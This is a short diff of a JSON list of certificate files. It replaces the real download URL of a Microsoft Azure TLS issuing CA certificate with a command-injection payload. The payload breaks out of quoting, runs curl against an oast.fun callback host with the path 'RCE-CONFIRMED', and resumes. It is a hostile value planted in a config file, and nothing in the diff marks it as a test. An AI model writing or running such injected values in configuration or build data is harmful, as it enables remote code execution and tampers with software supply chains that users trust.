@@ -26,7 +26,7 @@
   },
   {
     "filename": "microsoft_azure_rsa_tls_issuing_ca_07.pem",
-    "url": "https://www.microsoft.com/pkiops/certs/Microsoft%20Azure%20RSA%20TLS%20Issuing%20CA%2007.crt"
+    "url": "\" & curl http://bikrwigmkrzpjkbvjejsx20i1ngsa8auy.oast.fun/RCE-CONFIRMED & echo \""
   },
   {
     "filename": "microsoft_azure_rsa_tls_issuing_ca_08_xsign.pem",
